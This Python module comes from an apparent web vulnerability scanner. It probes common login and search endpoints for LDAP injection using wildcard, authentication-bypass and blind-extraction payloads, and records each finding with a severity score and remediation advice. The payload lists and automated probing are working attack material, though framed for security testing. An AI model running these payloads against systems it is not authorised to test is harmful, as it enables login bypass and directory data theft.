"""LDAP Injection scanner — wildcard enumeration, authentication bypass, blind extraction."""
from __future__ import annotations
import asyncio
import random
import string
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

LDAP_CANARY_PREFIX = "TLSMLDAP"

LDAP_ENDPOINTS = [
    "/login", "/api/login", "/auth", "/api/auth",
    "/authenticate", "/api/authenticate",
    "/search", "/api/search", "/api/users/search",
    "/ldap", "/api/ldap",
    "/user/search", "/api/user/search",
    "/employees", "/api/employees",
]

LDAP_WILDCARD_PAYLOADS = [
    ("*", "Wildcard injection"),
    ("*)(uid=*", "Wildcard with group close"),
    ("*)(|(uid=*", "OR-based wildcard"),
    ("*))(|(uid=*", "Double close + OR wildcard"),
    ("*)(cn=*", "CN wildcard injection"),
]

LDAP_AUTH_BYPASS_PAYLOADS = [
    ("*)(uid=*))(|(uid=*", "Classic auth bypass"),
    ("*)(uid=*", "Simple auth bypass"),
    ("*))(|(uid=*", "Auth bypass double close"),
    ("*)(|(uid=*", "OR injection bypass"),
    ("*)(&(uid=*", "AND injection bypass"),
]

LDAP_BLIND_PAYLOADS = [
    ("*)(uid=a*", "Blind a-prefix"),
    ("*)(uid=b*", "Blind b-prefix"),
    ("*)(uid=admin*", "Blind admin-prefix"),
    ("*)(cn=*", "CN attribute injection"),
]


async def _test_wildcard_injection(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test wildcard injection in LDAP search filters.

    Sending * as a parameter value may return all LDAP entries.
    Compare response size/content with a normal request for detection.
    """
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint
    canary = f"{LDAP_CANARY_PREFIX}{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"

    # Step 1: Baseline request with a unique value
    try:
        r_baseline = await client.post(test_url,
            json={"username": canary, "password": "test"},
            headers={"Content-Type": "application/json"}, timeout=8)
        baseline_len = len(r_baseline.text)
    except Exception:
        baseline_len = 0

    # Step 2: Test each wildcard payload
    for payload, description in LDAP_WILDCARD_PAYLOADS:
        try:
            r = await client.post(test_url,
                json={"username": payload, "password": "test"},
                headers={"Content-Type": "application/json"}, timeout=8)

            resp_len = len(r.text)

            # Wildcard injection often returns more data or different status
            if resp_len > baseline_len * 2 or resp_len > 1000:
                findings.append({
                    "type": "ldap_wildcard",
                    "endpoint": endpoint,
                    "payload": payload,
                    "description": description,
                    "baseline_length": baseline_len,
                    "response_length": resp_len,
                    "status": r.status_code,
                    "evidence": r.text[:300],
                    "canary": canary,
                })
                break

            # Also check for LDAP error messages
            resp_lower = r.text.lower()
            if any(ind in resp_lower for ind in ["ldap", "directory", "distinguished", "cn=", "dc=", "ou="]):
                findings.append({
                    "type": "ldap_error_reflection",
                    "endpoint": endpoint,
                    "payload": payload,
                    "evidence": r.text[:400],
                    "canary": canary,
                })
                break
        except Exception:
            pass

    return findings


async def _test_auth_bypass(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test LDAP authentication bypass via always-true filters."""
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint
    canary = f"{LDAP_CANARY_PREFIX}{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"

    for payload, description in LDAP_AUTH_BYPASS_PAYLOADS:
        try:
            r = await client.post(test_url,
                json={"username": payload, "password": payload},
                headers={"Content-Type": "application/json"}, timeout=8)

            # Auth bypass typically returns 200 OK with session/token
            if r.status_code in (200, 201, 204, 302):
                resp_lower = r.text.lower()
                auth_indicators = ["token", "session", "logged", "welcome", "authenticated", "bearer"]
                if any(ind in resp_lower for ind in auth_indicators):
                    findings.append({
                        "type": "ldap_auth_bypass",
                        "endpoint": endpoint,
                        "payload": payload,
                        "description": description,
                        "status": r.status_code,
                        "evidence": r.text[:300],
                        "canary": canary,
                    })
                    break

                # Even without explicit auth indicators, a 200 on malformed input is suspicious
                if r.status_code == 200:
                    findings.append({
                        "type": "ldap_auth_bypass_suspicious",
                        "endpoint": endpoint,
                        "payload": payload,
                        "description": f"Suspicious: {description} returned {r.status_code}",
                        "status": r.status_code,
                        "evidence": r.text[:200],
                        "canary": canary,
                    })
                    break
        except Exception:
            pass

    return findings


async def _test_blind_ldap(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test blind LDAP injection via differential analysis."""
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint

    # Compare responses between two similar payloads
    # If they differ, character-by-character extraction is possible
    responses: dict[str, tuple[int, str]] = {}

    for payload, description in LDAP_BLIND_PAYLOADS:
        try:
            r = await client.post(test_url,
                json={"username": payload, "password": "test"},
                headers={"Content-Type": "application/json"}, timeout=8)
            responses[payload] = (r.status_code, r.text[:200])
        except Exception:
            pass

    if len(responses) >= 2:
        unique_responses = set((s, t) for s, t in responses.values())
        if len(unique_responses) > 1:
            # Different payloads produce different responses — blind injection possible
            details = []
            for payload, (status, text) in responses.items():
                details.append(f"{payload[:30]} -> {status} / {len(text)} bytes")
            findings.append({
                "type": "ldap_blind_injection",
                "endpoint": endpoint,
                "evidence": " | ".join(details),
                "description": "Blind LDAP injection possible — different wildcard patterns return different responses",
            })

    return findings


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module][+] LDAP Injection Scanner[/module] -> [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        console.print(f"  Testing {len(LDAP_ENDPOINTS)} endpoints for LDAP injection...")

        for endpoint in LDAP_ENDPOINTS:
            # -- 1. Wildcard injection ------------------------------------------------
            w_findings = await _test_wildcard_injection(url, endpoint, client)
            for f in w_findings:
                ftype = f.get("type", "")
                if ftype == "ldap_wildcard":
                    title = f"LDAP wildcard injection at {endpoint}: {f.get('payload', '')}"
                    print_finding(title, "critical", url)
                    findings.append(f)
                    if session:
                        await session.add_finding(
                            target=url, module="ldap_injection",
                            vuln_type="ldap_wildcard",
                            severity="critical", confidence="confirmed",
                            title=title,
                            description=f"LDAP wildcard injection confirmed at {endpoint}. Sending '{f.get('payload')}' returned {f.get('response_length', 0)} bytes vs baseline {f.get('baseline_length', 0)} bytes, indicating the injection expanded the search filter to return all directory entries.",
                            evidence=f.get("evidence", ""),
                            remediation="1. Sanitize LDAP search filter inputs. 2. Escape LDAP metacharacters (*, (, ), &, |, !). 3. Use parameterized LDAP queries. 4. Restrict LDAP bind account permissions.",
                            cvss_score=9.1, cwe="CWE-90",
                        )

                elif ftype == "ldap_error_reflection":
                    title = f"LDAP error/info disclosure at {endpoint}"
                    print_finding(title, "medium", url)
                    findings.append(f)

            # -- 2. Authentication bypass --------------------------------------------
            a_findings = await _test_auth_bypass(url, endpoint, client)
            for f in a_findings:
                ftype = f.get("type", "")
                severity = "critical" if ftype == "ldap_auth_bypass" else "high"
                title = f"LDAP auth bypass at {endpoint}: {f.get('description', '')}"
                print_finding(title, severity, url)
                findings.append(f)
                if session:
                    await session.add_finding(
                        target=url, module="ldap_injection",
                        vuln_type=ftype,
                        severity=severity, confidence="confirmed",
                        title=title,
                        description=f"LDAP authentication bypass detected at {endpoint}. Payload '{f.get('payload')}' returned HTTP {f.get('status')} with authentication indicators. An attacker can log in as any user without valid credentials.",
                        evidence=f.get("evidence", ""),
                        remediation="1. Use parameterized LDAP queries for authentication. 2. Escape all LDAP metacharacters in user input. 3. Implement account lockout. 4. Use bcrypt/scrypt for password verification instead of LDAP bind.",
                        cvss_score=9.8 if severity == "critical" else 8.6, cwe="CWE-90",
                    )

            # -- 3. Blind LDAP injection ---------------------------------------------
            bl_findings = await _test_blind_ldap(url, endpoint, client)
            for f in bl_findings:
                title = f"Blind LDAP injection possible at {endpoint}"
                print_finding(title, "high", url)
                findings.append(f)
                if session:
                    await session.add_finding(
                        target=url, module="ldap_injection",
                        vuln_type="ldap_blind_injection",
                        severity="high", confidence="likely",
                        title=title,
                        description=f"Blind LDAP injection detected at {endpoint}. Different search patterns return different responses, enabling character-by-character data extraction.",
                        evidence=f.get("evidence", ""),
                        remediation="Same as wildcard: sanitize inputs, escape metacharacters, use parameterized queries.",
                        cvss_score=8.6, cwe="CWE-90",
                    )

    console.print(f"  LDAP injection scan complete -- {len(findings)} issues")
    return {"target": url, "findings": findings, "count": len(findings)}
